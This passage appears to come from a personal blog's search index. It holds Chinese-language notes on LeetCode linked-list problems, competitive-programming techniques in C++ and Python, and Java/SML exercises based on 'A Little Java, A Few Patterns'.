ptr_next.next = ptr ptr = ptr_next ptr_next = tmp return [ptr,a] # head, tail group_head = head prev_group_tail = None ret = None while group_head: group_tail = group_head for _ in range(k): if not group_tail: return ret if ret else head else: group_tail = group_tail.next h,d = rev(group_head,group_tail) if not ret: ret = h else: prev_group_tail.next = h d.next = group_tail group_head = group_tail prev_group_tail = d return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-25-reverse-nodes-in-k-group/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前寫的很爛，居然還用到例外!?\n所以重寫\u003c/p\u003e","title":"leetcode-25 - Reverse Nodes in k-Group"},{"content":"動機 就faq，所以把記得的列一下\ninsert def insert_node(head,n,newnode): prev = None while head and n != 0: prev = head head = head.next n -= 1 if n == 0: if prev: prev.next = newnode newnode.next = head else: newnode.next = head else: raise RuntimeError() delete def del_node(head,n): cur = head ret = None prev = None while cur: if cur.val == n: if prev: prev.next = cur.next elif not ret: ret = cur.next if not ret: ret = head return ret reverse 這邊給的revserse是[a,b)\nrecursive 先到最後一個，之後回去時再一層一層接回去\ndef rev(a,b): # [a,b) if a.next is b: return [a, a] else: h,d = rev(a.next,b) d.next = a return [h,a] # head, tail iterative 1 -\u0026gt; 2 -\u0026gt; 3，2 -\u0026gt; 1 , 3，3- \u0026gt; 2 -\u0026gt; 1 每次交換完，都是被換(1換2)的變成下一次loop要被換下去的(2換3) 所以可以給出兩個ptr，一個是要被換的，另一個是與之交換的\ndef rev(a,b): # [a,b) ptr = a ptr_next = a.next a.next = None #第一次換要把連結打斷，不然會loop while ptr_next is not b: tmp = ptr_next.next ptr_next.next = ptr # 2 指向 1 ptr = ptr_next # 下一次處理2 ptr_next = tmp return [ptr,a] # head, tail 找中點 j走的距離是i的兩倍!! 所以當j到底時i剛好在一半\ndef mid(root): i = root j = root while j and j.next: i = i.next j = j.next.next return i 關於sort 要用merge sort，不能用quick sort，qsort的worst case可以到n^2，但merge都是nlogn\n","permalink":"https://littlebees.github.io/2021/07/linked-list%E7%9A%84faq/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就faq，所以把記得的列一下\u003c/p\u003e","title":"linked-list的faq"},{"content":"動機 現在習慣寫LC，都已經忘了怎麼用c++或是python來讀stdin，所以來整理一下\nC++ stdin 一般(空白分隔) int n; while (n \u0026lt;\u0026lt; cin) {} 一整行 string name; while (getline (cin,name)) {} 其他(有分隔號) string name; while (getline (cin,name,\u0026#39;,\u0026#39;)) {} file open 基本都是fstream，但如果只是要讀或寫可以直接用ifstream或ofstream\nstring name; ifstream fs; fs.open(\u0026#34;test.txt\u0026#34;); while (getline(fs,name)) {} read 同stdin(cin)\nmap, unorder_map (set與其實是一樣的東西) map就是自平衡二元搜尋樹，好像是rbtree，所以這個會替key排序 unorder_map自然就是hash table了\niterate(C++11): for (auto\u0026amp; kv : a_map) { kv.first,kv.second; } iterate: for (map\u0026lt;string, int\u0026gt;::iterator it = a_map.begin(); it != a_map.end(); it++) { it-\u0026gt;first,it-\u0026gt;second; } string operation cast string-\u0026gt;int // C++11 #include \u0026lt;string\u0026gt; int n = stoi(\u0026#34;123\u0026#34;); double nn = stod(\u0026#34;1.23\u0026#34;); // C++98 #include \u0026lt;sstream\u0026gt; int i; double d; // string -\u0026gt; integer std::istringstream ( \u0026#34;123\u0026#34; ) \u0026gt;\u0026gt; i; // string -\u0026gt; double std::istringstream ( \u0026#34;1.23\u0026#34; ) \u0026gt;\u0026gt; d; int-\u0026gt;string: // C++11 #include \u0026lt;string\u0026gt; string n = to_string(123); string nn = to_string(1.23); // C++98 #include \u0026lt;sstream\u0026gt; std::ostringstream ss1,ss2; ss1 \u0026lt;\u0026lt; 123; ss2 \u0026lt;\u0026lt; 1.23; cout \u0026lt;\u0026lt; ss1.str() \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; ss2.str(); common operations substr: str.substr(start, len) length: str.length() reverse: string reversed(str.rbegin(), str.rend()); or std::reverse(copy.begin(), copy.end()); split(string -\u0026gt; vector) 用find找pos再substr，之後erase 如果只有char用stringstream會好打一點 // for string delimiter vector\u0026lt;string\u0026gt; split (string s, string delimiter) { size_t pos_start = 0, pos_end, delim_len = delimiter.length(); string token; vector\u0026lt;string\u0026gt; res; while ((pos_end = s.find (delimiter, pos_start)) != string::npos) { token = s.substr (pos_start, pos_end - pos_start); pos_start = pos_end + delim_len; res.push_back (token); } res.push_back (s.substr (pos_start)); return res; } vector operation pop, push_back slice: std::vector\u0026lt;int\u0026gt;(v1.begin(), v1.begin()+ len); (創一個新的) length: vec.size() iterate: for (auto\u0026amp; item : vec) {} reverse: vector\u0026lt;int\u0026gt; reversed(vec.rbegin(), vec.rend()); or std::reverse(copy.begin(), copy.end()); map(C++11): std::transform(nums.begin(), nums.end(), nums.begin(), [](int num) {return std::pow(num, 2);}); filter(C++11): std::copy_if(nums.begin(), nums.end(), std::back_inserter(odd_nums), [](int num) {return num \u0026amp; 1;}); reduce(C++11): #include \u0026lt;numeric\u0026gt; std::accumulate(vector.begin(), vector.end(), decltype(vector)::value_type(0)); union find unordered_map\u0026lt;int,int\u0026gt; fd; vector\u0026lt;int\u0026gt; rank; int find(int i) { while (i != fd[i]) fd[i] = fd[fd[i]], i = fd[i]; return i; } void union(int i,int j) { int a = find(i), b = find(j); if (a != b) { if (rank[i] \u0026gt; rank[j]) fd[j] = i, rank[i]++; else fd[i] = j, rank[j]++; } } trie struct Trie { unordered_map\u0026lt;char, struct Trie*\u0026gt; nextLevel; bool end; ~Trie() { for (auto\u0026amp; kv : nextLevel) { delete kv.second; } } void insert(string s) { Trie* trie = this; for (auto\u0026amp; c : s) { if (trie-\u0026gt;nextLevel.find(c) == trie-\u0026gt;nextLevel.end()) { trie-\u0026gt;nextLevel[c] = new Trie(); } trie = trie-\u0026gt;nextLevel[c]; } trie-\u0026gt;end = 1; } bool search(string s) { Trie* trie = this; for (auto\u0026amp; c : s) { if (trie-\u0026gt;nextLevel.find(c) != trie-\u0026gt;nextLevel.end()) { trie = trie-\u0026gt;nextLevel[c]; } else { return 0; } } return trie-\u0026gt;end; } bool startsWith(string s) { Trie* trie = this; for (auto\u0026amp; c : s) { if (trie-\u0026gt;nextLevel.find(c) != trie-\u0026gt;nextLevel.end()) { trie = trie-\u0026gt;nextLevel[c]; } else { return 0; } } return 1; } }; Python stdin 要記得rstrip，不然會有newline\nimport sys for line in sys.stdin: line.rstrip(\u0026#39;\\n\u0026#39;) print(line) 這裡有分隔號的讀嗎? 其實有但很少用，而且要在open file時指定，不如用split，還比較快 python的split不用自己刻\nfile with open(\u0026#34;file.txt\u0026#34;,\u0026#39;wr\u0026#39;,encoding=\u0026#39;utf8\u0026#39;, newline=\u0026#39;\\r\\n\u0026#39;) as file_in: lines = [] for line in file_in: lines.append(line) file_in.write(\u0026#39;write some str\u0026#39;) dict operations iterate for (k,v) in dd.items(): # keys, values print(k,v) string operation str -\u0026gt; int or float: int(\u0026quot;123\u0026quot;) float(\u0026quot;1.23\u0026quot;) numder -\u0026gt; str: str(123) reverse: str[::-1] or ''.join(reservsed(str)) split: str.split(',') slice: str[start:end:step] str[2:0:-1] [start, end) start包含，end不包含 list operation append, pop join: ','.join(arr) slice: 同str iterate for item in mylist: # range(0,len(mylist)) print(item) list comprehension: [n+1 for n in mylist if n % 2 is 0] map: list(map(lambda x: x+1, mylist)) filter: list(filter(lambda x: x % 2 is 0, mylist)) reduce: from functools import reduce reduce(lambda acc,x: acc+x, a, 10) deque operation q = deque() q.append(x) q.appendleft(x) q.pop() q.popleft() union find fd = { n:n for n in range(1,11)} rank = [ 0 for n in range(1,11)] # how many ansestors does this item have? def find(fd,i): while fd[i] != i: fd[i] = fd[fd[i]] # path compression, 往祖先設定 i = fd[i] return i def union(fd,rank,i,j): a = fd[i] b = fd[j] if a != b: if rank[i] \u0026gt; rank[j]: # 子孫越多tree越平 fd[j] = i rank[i] += 1 else: fd[i] = j rank[j] += 1 trie trie = [{},False] def addString(trie, s): for c in s: if c not in trie[0]: trie[0][c] = [{}, False] trie = trie[0][c] trie[1] = True def find(trie, s): for c in s: if c in trie[0]: trie = trie[0][c] else: return False return trie[1] dp tips 可以用functools.cache\n@functools.cache def fib(n): if n \u0026lt; 2: return 1 else: return fib(n-1)+fin(n-2) 如果有重複走的問題要自己處理\ndef cache_computing(f,is_computing=None): mem = {} @functools.wraps(f) def wrapper(*args,**kwds): if args not in mem: mem[args] = is_computing mem[args] = f(*args,**kwds) return mem[args] return wrapper Algo經典手法與題目recap prefix sum 用法 算區間和 和 從a~b的總和 如果有負數，可以代表偏離原點多遠 一般來說，通常第一個會是0代表沒有加任何東西的狀態 所以index從1開始，代表從arr[0]~arr[i-1] static (index -\u0026gt; sum) list(accumulate(nums, initial=0)) LC209 因為arr只有正數 可以用sliding window，去收縮大小 可以用prefix sum，在prefix sum做binary search 我們會先列舉起點到終點 所以prefix sum也是從起點去往後找終點 TODO: LC209與LC525為什麼一個是從後面一個從前面 in fly (sum -\u0026gt; count or [index]) LC560 基本款 LC525 與LC209不同這裡是每加一個都會產生變化 所以可以用in fly一邊建prefix sum，再找有沒有符合的 注意同一個sum我們只要最前面的 Monotonic stack 用法 根據關注點不同有不同的看法 排序，留下最後的字典序 (stk是重點) 1 3 7 2 1 2 可以看成2把3,7吃了，只留下該範圍最小的，這也是字典序的由來 內容物: 節點 區塊 夾出區間，中間是最大或是最小 (被pop的資料是重點) while stk and stk[-1] \u0026lt;= n 7 3 2 ..left.. 1 ..right.. 2 right的所有數字都會小於1 left的所有數字都會等於1 1是這個區間(去頭尾)最大的，含頭尾的區間中的最小的 while stk and stk[-1] \u0026gt;= n 1 2 3 ..left.. 7 ..right.. 2 right的所有數字都會大於7 left的所有數字都會等於7 7是這個區間最小的，含頭尾的區間中的最大的 這樣就可以用stk[-2]與n，做出一個閉區間 記得處理沒有stk的case 在需要保持原本的順序、字典序、前面的資料會被後面的蓋掉時就可以老慮用用看 夾出區間 LC84 經典 小的柱子會被大的蓋掉，只取小的 用成圖: 1,1,1,...1, 2,3,4, 10 很明顯就是monotonic stack 取pop出的柱子去乘左右兩邊構成的區間長度 LC1130 如果要最小一定是找最小的數字，之後是左右兩邊最小的 化成圖: a .left. min .right. b 有什麼辦法可以保證min一定是a~b之間最小的? monotonic stack while stk and stk[-1] \u0026lt;= n 最後乘的時候要確認哪邊是小的!! LC1793 就是LC84 不過要在對的區間時才能更新答案 這裡可以與LC402比 402是控制pop TODO: 這樣stack的性質會是對的嗎? 1793是控制更新答案 LC1856 區間中最小、又要連續 化成圖: 7 3 2 ..left.. 1 ..right.. 2 之後用prefix sum加速加總 LC907 區間中最小，monotonic stack 化成圖: 1 2 3 ..left.. 7 ..right.. 2 LC42 只要被兩個柱子夾起來的部份而已!! 排序 LC402 如果只是移除多的字以完成最小字典序不難就mono stack 但是有限制次數，所以不能一直pop LC316 同樣是移除字完成最小字典序 但與LC402不同的是，這次是不能放入同樣的字 注意到，這次條件是打在最外面 只要重複就連stack都不pop 但402是還可以放數字到stack LC768 這題把stack的sort具體化，這話怎麼說 前面提過小的會把大的吃掉，所以現在紀錄的是範圍最小 但這題最後要留下範圍最大的item LC901 就是LC768 要記下區間最大值 不過這題還要區間長度 LC581 可以用LC768去生chunk，之後把頭尾去掉，把所有長度加起來 TODO: 但可以不用那麼麻煩 下一個最大 LC503 這是monotonic stack的經典展現 求下一個最大 觸發pop的數字就是下一個最大 circular? nums兩倍長就好 LC739 求下一個最大之間的距離 所以stack放index 這裡會遇到一個有趣的case [1, 2, 2]要怎麼處理? 加等號: 會讓後面的2被吃掉 不加: 2留著 怎麼叫更溫暖? 大於，所以不加等號 難 LC456 這要認真推 先暴力 原本1\u0026lt;2\u0026lt;3 會從3開始找，之後2再來1 會從最大的開始找!! 但現在 1\u0026lt;3\u0026lt;2 這要從哪裡開始找? 先從大的開始，所以是2 但怎麼確認3 (難的地方!!) 從後面開始看 這樣會有 1 1 1 2 3 3 3 之後是大小，2要大於3，最好會自動清 monotonic stack 清出來的就是可能的2，而我們挑最大的 要等號嗎? 不用!! 保留可能性 所以要做的是 從後往前，塞stack (3的候補) 出現大的數字，清stack (2的候補) 剩下只要比對是不是符合132 class Solution: def find132pattern(self, nums: List[int]) -\u0026gt; bool: stk = [] mid = float(\u0026#39;-inf\u0026#39;) for n in reversed(nums): if n \u0026lt; mid and stk: return True while stk and stk[-1] \u0026lt; n: mid = max(mid,stk.pop()) stk += n, return False LC862 區間總和，但是 有負數 大於等於目標 算區間和，prefix sum 所以就一直記prefix sum，從最小的開始算和(queue) 如果sum太大怎麼辦 所以要清 (stack，這不單調，只是要清總和太大的項目) binary search bsearch不一定要排序才能用 bsearch最好用左閉右開 注意mid會不會重複 用法\n找目標 猜數字 逼近 (LC4) 題目 LC162 右邊的點要在答案中 也就是重合時會等於的值 往大的方向走 就算沒有sort也可以用!! LC4 有sort也不一定看的出來可以用bsearch 這裡重點是長度 每次把小的區段丟掉 LC1011 猜每天要在多少重量 但範圍是重點 太大會很慢 每一個貨物當成最重的重量，去算平均 LC33 確認兩件事 哪一塊是遞增的 目標在這一塊嗎 另外 如果長度是2，mid會輪迴!! LC153 對rotate的長度做bsearch LC327 prefix sum + 不等式 用lower bound與upper bound找index sliding window 基本 用閉區間做 列舉終點\na = 0 win = [] for b in range(len(fs)): update_win() while a \u0026lt;= b and when_win_is_illegal(): shrink_win() update_ret() return ret 列舉起點\nb = 0 win = [] for a in range(len(fs)): while b \u0026lt; len(fs) and when_win_is_legal(): update_ret() expand_win() shrink_win() return ret atMost\ndef atmost(bound): ret = i = 0 for j,n in enumerate(nums): update_win() while i \u0026lt;= j and when_win_is_illegal(): shrink_win() ret += j-i+1 return ret 題目 LC220 這裡index的abs用sliding window處理 數字用不等式推論 之後會看到lower bound LC995 這裡的重點是處理flip flip的問題 現在是什麼bit 範圍到哪 範圍就想到index 所以要有方法追蹤有flip的index 並在超出範圍時刷掉 queue做sliding window LC713 用sliding window找最靠近k的window 但接著就是怎麼算現在的window有多少組合? 魔法: right-left + 1 class Solution: def totalFruit(self, fs: List[int]) -\u0026gt; int: win = Counter() a = 0 ret = 0 for b in range(len(fs)): win[fs[b]] += 1 while a \u0026lt;= b and len(win) \u0026gt; 2: win[fs[a]] -= 1 win += Counter() a += 1 ret = max(ret, b-a+1) return ret LC395 長度是至少k 所以不好當sliding window的條件 需要別的條件 字母只有26個 限制最多多少字母可以出現在window中!! LC424 怎麼找出有多少非法字 總長度 = 最多的字 + 其他字 LC992 新招式: atMost 小於等於limit有多少組合 LC1234 window中的東西可以亂生 外面不超標的話就可以用window把string給平衡掉 LC1248 可以用atMost 也可以之前的魔法 right-left+1是以此點為終點的組合數 之後就是在奇數到期時加到答案中 monotonic queue LC239 明顯是sliding window 但要最大值 monotonic stack 還要顧index deque 兩個結合就是monotonic queue two pointer linked list vs array LC148 只能用merge sort 因為不能隨機跳位置 LC19 這是list，一旦過了就回不去 但可以像找中點，讓兩個ptr之間保持距離 這裡是固定距離，中點是找兩倍 LC61 \u0026amp; LC189 先談rotate array 一個是Cyclic replace (不好做) 另一個是 reverse整條 reverse 0~k 與 reverse k~end 再談rotate list 延續reverse的解法 第一次reverse是把後面的拉到前面 第二次reverse是把順序用成對的 但這裡是list，所以可以直接把list分成兩個 接上去就好 index,ptr as list LC283 一個ptr做為0的list的終點 另一個ptr是還沒看過的item的list的起點 LC26 同LC283 一個終點一個起點，一直換 LC905 類似LC283 但一個從array的頭，一個從尾塞 LC75 類似LC905 但要記得從後面換的部分還是屬於沒看過的部分，所以還要再看一次 LC86 把list分一半 兩個list指向list的終點 Linked list需要確保每次新增node時不會loop 要記得把next設成None LC143 類似LC86 classic LC142 判圈 一個走一倍，一個走兩倍 只要相遇就是圈 圈的起點 慢走的長度是 起點到圈起點 + 某個數字*圈長度 快走的長度是 起點到圈起點 + 某個數字*圈長度 兩個相減就會看到現在長度其實是 圈長度的整數倍 也就是說，不管從哪裡都可以算是圈的起點 所以只要從起點走遇到另一個ptr就是圈的起點 LC15 3sum 從頭開始走剩下的部分做2sum LC18 nSum 延伸3sum，直到只剩下2sum之前 都是當成3sum處理 LC876 Linked List中點 一個走一倍，一個走兩倍 另一個到終點，現在的就是中點 根據跳出來的條件可以看長度是奇數還是偶數 因node.next跳出來，偶數 因node.next.next跳出來，奇數 LC287 有很多解法 bsearch (猜數字) 注意到資料都是在index的範圍內 可以用判圈 可以把資料換到對應的index上 另外該資料也會是0~i之間最大的 見chunk那一題 misc LC986 merge interval可以 把兩個interval看頭尾，挑最靠近裡面的部分 在最小中挑最大 在最大中挑最小 如果新interval的頭大於尾，這新interval就是非法的 每次都丟尾最小的 LC844 上stack 直接從尾開始比，之後統計刪的次數，有counter時跳掉 為什麼是尾開始 delete往前刪 所以前面不會確定 但後面不會被影響 有點像moore voting LC763 所有char都要在同一區 一次一次紀錄每個char最後出線的index 什麼時候才切成一區? 當下的位置就是最後的位置時 可以看chunk與LC287作對比 LC42 對於每個柱子，就是看 左右都比自己高 挑矮的，算差距 因為每次都只看最矮的 所以可以像2sum去縮 heap python原本只有heapq，十分不好用 但是可以搭配已經sort好的list去用他的heappop與heappush LC352 可以用SordtedList好用超多，遠比C++的set或是map好用 divide and conquer LC327 右邊index一定大於左邊 針對每個左邊index找右邊符合需求的區間 LC493 TODO: 要看裡面怎麼用bit，感覺與divide and conquer有一點關係 Dynamic programming TODO 刷表法 \u0026amp; 填表法差別 用途 此點的狀態，像palindromic 到目前為止的總和，一般的dp都是以此為目標去求 from start or end LC198 dp可以從 起點開始算 要先把整個長度算好 這是環狀 長度兩倍 終點算回去 簡單很多!! max(self.ns[i] + self.dp(i-2), self.dp(i-1)) 任何dp都建議從終點算回去 bottom-up 與 top-down LC718 如果用top-down 除了要看字有沒有一樣 還要追蹤長度!! 因為要連續 f(i,j,l) max(ret, f(i-1,j,0), f(i,j-1,0)) ret = f(i-1,j-1,k+1) if s[i] == s[j] else k 這是n^3 用bottom-up dp[i][j] = dp[i-1][j-1]+1 if if s[i] == s[j] else 0 這是n^2 因為是長度所以比起top-down少很多東西 LC546 真的什麼都想不到的話就是dp去模擬 要什麼項目(參數、狀態定義) 怎麼轉換 f(i,j,k) i,j是範圍 k是與j同顏色的盒子數量 所以這裡就兩個case 直接把所有盒子用掉，算分數 抓中點，去增加k的數量 [dp(i,x,k+1)+dp(x+1,j-1,0) for x in range(i,j) if boxes[x] == boxes[j]] classic LC72 edit dist replace: (i-1,j-1) delete: (i,j-1) insert\u0026quot; (i-1,j) insert多一個字，又馬上比對，所以與delete相反 LC647 palindromic s[i] == s[j] and ispalid(i+1,j-1) 這題其實做從中心展開會比較好 都是n^2，還比較簡單 LC516 palindromic 不用在失敗時結束，要把字刪掉 max(dp(i+1,j),dp(i,j-1)) 剩下就是原本的dp LC322 coin 有兩種 一個是從背包抄來的 f(total, i) 一個是完全不用: f(total, i-1) 一個是一直try: f(total-arr[i]*n, i) 這是n^2 另一個是用total做狀態 f(total) 每個都try: min([f(total-n) for n in arr]) 這個是n LC139 word break 這不是教科書會出現的dp經典 但是處理leetcode的字串列舉常常用到 f(s) 對bank的每個字比開頭 f(s[len(w):]) 題外話 bank的處理還有一個是用bfs配把字碼調 像*bc、a*b、ab* 處理換字能不能換成另一個字的問題 再題外話 像是倒水問題這種狀態變化固定的都可以用bfs找最短路徑 但要把狀態定義好!! LC152 LIS 這題是LIS的進化版 原本是 lis(i) max(arr[i], arr[i]+lis(i)) 但負數也有可能會是選項!! 所以要同時計min與max，不能像原版只用max LC354 LIS 這題是二維LIS 但要處理第一維同數字的問題 第一維increasing排序 第二維decreasing排序 LC64 棋盤 就是看能往哪走 f(i,j) grid[i][j]+min(f(i-1,j), f(i,j-1)) 建議都是用終點去推 TODO: 有一題就是一定要用終點推 如果用起點走就是dfs LC338 奇偶 偶: 2n 奇: 2n+1 可以直接用!! LC96 BST與range BST就是左邊小、右邊大 所以有range BST是tree 常用的dfs 在range上列舉中點，算組合數 hard LC87 這種有明確標示動作與做reduction對象的都很簡單 但這題要注意swap的string可能還沒被比完!! 要用cache_computing LC396 把函數列出來 找規律 (所以難，有緣就找的到) f(n) = f(n-1) - sum + len(arr)*arr[n-1] LC312 如果用平常的作法 f(i,j)是i~j的最大分數就會變成兩邊 十分痛苦 要看成 這區域的氣球都爆完的分數有多少 列舉要爆的氣球 max( nums[left] * nums[i] * nums[right] + dp(left, i) + dp(i, right) for i in range(left+1, right) ) LC926 分成ones與zeros就可以看出要用prefix sum 如果要用dp，就要看怎麼建構合法的答案 最後一位如果是1，可以直接接上去 如果是0，不是把前面的1換成0，就是把自己這一位換成1 LC600 f(i)i位數的合法組合數 (沒有連續1) 以5為例 10 111 ~ 10 000: f(3) 0 1111 ~ 0 0000: f(4) 11 111 ~ 11 000非法 01 111 ~ 01 000會被包含 f(i) = f(i-1)+f(i-2) 所以剩下就是從最高位往下加f(k) 同時看有沒有連續1出現!! LC44 其實就是用string比對處理(edit dist) 但要注意最後pat只剩下star的狀態!! LC188 能用到mutual recursion!! 定義buy(i,k)andsell(i,k) 分別定義 buy(i,k): 在i時還有k次購買機會的購買的最大收益 buy(i-1,k) sell(i-k,k-1)-arr[i] sell(i,k): 在i時還有k次購買機會的賣出的最大收益 sell(i-1,k) buy(i-k,k)+arr[i] 另外也可以用挑區段，去接來看 如果當成lis去看，之後跑k次 分成歷史上的最大(global)與當前的最大(local) 之後就是用lis更新local 之後更新global local = max(global[i], local + prices[i] - prices[i-1]) global[i] = max(global[i-1], local) 另外。LC122 最高到最低的總和就是各個區段的總和 所以就是在increasing時把所有差額加起來 LC376 這題對我有因緣 因為是用自己的dp過的 先過整條array看是increasing還是decreasing 之後根據方向，跑lis 因為有兩個方向，所以可以定義mutual recursion arr[i-1] \u0026gt; arr[i] up[i] = down[i-1]+1 down[i] = down[i-1] arr[i-1] \u0026lt; arr[i] up[i] = up[i-1] down[i] = up[i-1]+1 arr[i-1] == arr[i] up[i] = up[i-1] down[i] = down[i-1] line sweap 把起終點分開，[start, -height], [end, height] 根據位置與高度排序 之後一個一個走 把高度塞到heap中 (line sweap) 負的就塞 正的就去刪 之後就是用heap去確認當前高度，去調整答案 elegant sol 這裡是收集一些原本用dp但是有超級優雅的解 LC828 from lee215 AXXXAXXA 看中間的A到左右兩邊的A隔3與2個字元(4與3個洞) 所以只包含中間A的組合是12 所以只要針對所有字元中間的洞算組合數就好!! LC1569 這是BST，有左右兩邊 而我們有第一個點，root 可以分左右兩邊 算組合數: comb(len(right)+len(left), len(right))*f(right)*f(left) LC678 把所有星號當成左括號，去計數，如果左括號太少，就直接False 把所有星號當成右括號，去計數，全部跑完，看有沒有被扣完 ","permalink":"https://littlebees.github.io/2021/07/competitive-programming%E7%9A%84tips/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e現在習慣寫LC，都已經忘了怎麼用c++或是python來讀stdin，所以來整理一下\u003c/p\u003e","title":"competitive programming的tips"},{"content":"動機 這已經雪藏很久了，久在github page還沒用到之前就在我的google docs中 整理一下貼出來\nCh1 datatype in Java abstract class N {} class Zero extends N {} class AddOne extends N {} =\u0026gt;\ndatatype N = Zero | AddOne of N 就是datatype\nThe First Bit of Advice When specifying a collection data, use abstract classes for datatypes and extended classes for variants.\nCh2 list recur ( [type] -\u0026gt; bool \u0026amp; [type(‘a)] -\u0026gt; ‘a) onlyA abstract class Ab { abstract boolean onlyA(); } class Base extends Ab { boolean onlyA() { return true; } } class B extends Ab { Ab ab; B(Ab _ab) { ab = _ab; } boolean onlyA() { return false; } } class A extends Ab { Ab ab; A(Ab _ab) { ab = _ab; } boolean onlyA() { return ab.onlyA(); } } ab.{{func}}，在ML中的ab是{{func}}的參數！！\ndatatype Ab = Base | A of Ab | B of Ab fun onlyA(Base) = true | onlyA(A(ab)) = onlyA(ab) | onlyA(B(ab)) = false (onlyA : Ab -\u0026gt; bool) hold_what abstract class Ab { abstract boolean onlyA(); abstract Object hold_what(); } class Base extends Ab { Object hold; Base(Object _hold) { hold = _hold; } Object hold_what() { return hold; } boolean onlyA() { return true; } } class B extends Ab { Ab ab; B(Ab _ab) { ab = _ab; } boolean onlyA() { return false; } Object hold_what() { return ab.hold_what; } } class A extends Ab { Ab ab; A(Ab _ab) { ab = _ab; } boolean onlyA() { return ab.onlyA(); } Object hold_what() { return ab.hold_what; } } datatype ‘a Ab = Base of ‘a | A of Ab | B of Ab fun hold_what(Base(x)) = x | hold_what(A(ab)) = hold_what(ab) | hold_what(B(ab)) = hold_what(ab) (hold_what : ‘a Ab -\u0026gt; ‘a) The Second Bit of Advice When writing a function over a datatype, place a method in each of the variants that make up the datatype. If a field of a variant belongs to the same datatype, the method may call the corresponding method of the field in computing the function.\ntemplate method pattern abstract class Point { abstract boolean closerTo(Point p); abstract int dist(); } class C extends Point { int x,y; C(int x,int y) { x = x; y= y;} boolean colserTo(Point p) { return dist() \u0026lt;= p.dist(); } int dist() { return abs(sqrt(x*x+y*y)); } } class M extends Point { int x,y; C(int x,int y) { x = x; y= y;} boolean colserTo(Point p) { return dist() \u0026lt;= p.dist(); } int dist() { return x+y; } } 可以把相同的抽到abstract放著\nabstract class Point { boolean closerTo(Point p) { return dist() \u0026lt;= p.dist(); } abstract int dist(); // template，template method pattern } my tip 在所有variant都一樣的function，可以放到abstract class\nCh3 list recur ([type] -\u0026gt; [type]) remA abstract class Ab { abstract Ab remA(); } class Base extends Ab { Ab remA() { return new Base(); } } class B extends Ab { Ab ab; B(Ab _ab) { ab = _ab; } Ab remA() { return new B(ab.remA()); } } class A extends Ab { Ab ab; A(Ab _ab) { ab = _ab; } Ab remA() { return ab.remA(); } } datatype Ab = Base | A of Ab | B of Ab fun remA(Base) = Base | remA(A(ab)) = remA(ab) | remA(B(ab)) = B(remA(ab)) (remA : Ab -\u0026gt; Ab) appB abstract class Ab { abstract Ab remA(); abstract Ab appB(); } class Base extends Ab { Ab remA() { return new Base(); } Ab appB() { return new Base(); } } class B extends Ab { Ab ab; B(Ab _ab) { ab = _ab; } Ab remA() { return new B(ab.remA()); } Ab appB() { return new B(ab.appB()); } } class A extends Ab { Ab ab; A(Ab _ab) { ab = _ab; } Ab remA() { return ab.remA(); } Ab appB() { return new B(new A(ab.appB())); } } (這還需要翻成ML嗎)\n如果 appB().remA()，其實與replace A成B是一樣的所以\nrepA abstract class Ab { abstract Ab repA(); } class Base extends Ab { Ab repA() { return new Base(); } } class B extends Ab { Ab ab; B(Ab _ab) { ab = _ab; } Ab repA() { return new B(ab.repA()); } } class A extends Ab { Ab ab; A(Ab _ab) { ab = _ab; } Ab repA() { return new B(ab.repA()); } } The Third Bit of Advice When writing a function that returns values of a datatype, use new to create these values.\ncomposite \u0026amp; interpreter pattern abstract class PizzaD { abstract PizzaD remA(); abstract PizzaD topAwC(); abstract PizzaD subAbC(); } class Crust extends PizzaD { PizzaD subAbC(){ return new Crust(); } PizzaD topAwC(){ return new Crust(); } PizzaD subAbC(){ return new Crust(); } } class Cheese extends PizzaD { PizzaD p; Cheese (PizzaD _p) { p = _p; } PizzaD remA(){ return new Cheese(p.remA()); } PizzaD topAwC(){ return new Cheese(p.topAwC()); } PizzaD subAbC(){ return new Cheese(p.subAbC()); } } class Olive extends PizzaD { PizzaD p; Olive (PizzaD _p) { p = _p; } PizzaD remA(){ return new Olive(p.remA()); } PizzaD topAwC(){ return new Olive(p.topAwC()); } PizzaD subAbC(){ return new Olive(p.subAbC()); } } class Anchovy extends PizzaD { PizzaD p; Anchovy (PizzaD _p) { p = _p; } PizzaD remA(){ return p.remA(); } PizzaD topAwC(){ return new Cheese(new Anchovy(p.topAwC())); } PizzaD subAbC(){ return new Cheese(p.subAbC()); } } class Sausage extends PizzaD { PizzaD p; Sausage (PizzaD _p) { p = _p; } PizzaD remA(){ return new Sausage(p.remA()); } PizzaD topAwC(){ return new Sausage(p.topAwC()); } PizzaD subAbC(){ return new Sausage(p.subAbC()); } } 這兩個pattern的本質是都是自己嵌套自己的datatype，所以可以達成如同list效果，可以無限嵌套來組合\nCh4 pattern match ver1(pass all args by myself \u0026amp; func in abstract class) 從Java到SML? 先複習onlyA\nabstract class Ab { abstract boolean onlyA(); } class Base extends Ab { boolean onlyA() { return true; } } class B extends Ab { Ab ab; B(Ab _ab) { ab = _ab; } boolean onlyA() { return false; } } class A extends Ab { Ab ab; A(Ab _ab) { ab = _ab; } boolean onlyA() { return ab.onlyA(); } } 接著改寫成像ML的樣子，把所有動作都放到同一個地方\nclass OnlyA { // closure!! OR visitor boolean forBase() { return true; } boolean forA(Ab ab) { return ab.onlyA(); } boolean forB(Ab ab) { return false; } } datatype Ab = Base | A of Ab | B of Ab fun onlyA(Base) = true | onlyA(A(ab)) = onlyA(ab) | onlyA(B(ab)) = false (onlyA : Ab -\u0026gt; bool) 這下把執行動作從variant分離出來了．\n但這要怎麼用？？ 如果這closure固定在一個所有variant可以碰到的地方的話\nvisitor (first try) abstract class Ab { OnlyA func = new OnlyA(); abstract boolean onlyA(); } class Base extends Ab { boolean onlyA() { return func.forBase(); } } class B extends Ab { Ab ab; B(Ab _ab) { ab = _ab; } boolean onlyA() { return func.forB(ab); } } class A extends Ab { Ab ab; A(Ab _ab) { ab = _ab; } boolean onlyA() { return func.forA(ab); } } The Fourth Bit of Advice When writing several functions for the same self-referential datatype, use visitor protocols so that all methods for a function can be found in a single class.\nCh5 equal!?(match self-defined type) \u0026amp; object as type var 原本應該要用equals去幹一個，但我懶所以用Integer class Rem1 { IntList forNull() { return new Null(); } IntList forCons(IntList l, Object i) { if(1.equals(i)) return l.rem1(); else return new Cons(i,l.rem1()); 